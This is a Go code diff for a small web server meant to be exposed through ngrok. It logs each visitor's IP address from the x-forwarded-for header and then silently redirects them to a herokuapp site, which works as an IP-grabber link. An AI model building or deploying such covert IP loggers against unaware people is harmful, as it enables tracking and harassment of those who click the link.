@@ -2,16 +2,17 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"log"
 )
 func main() {
-	fmt.Println("hola mundo")
+	fmt.Println("Use ngrok! `ngrok http 3000`")
+	fmt.Println("server on port 3000")
 	http.HandleFunc("/", getIP)
 	http.ListenAndServe(":3000", nil)
 }
 
 func getIP(w http.ResponseWriter, r *http.Request) {
 	ip := r.Header.Get("x-forwarded-for")
-	fmt.Println(ip)
-	http.Redirect(w, r, "https://www.twitch.tv/freddyfalso", 301)
-	fmt.Fprintln(w, "hola mundo")
+	log.Println("new ip : ", ip)
+	http.Redirect(w, r, "https://ranon-rat.herokuapp.com", 301)
 }
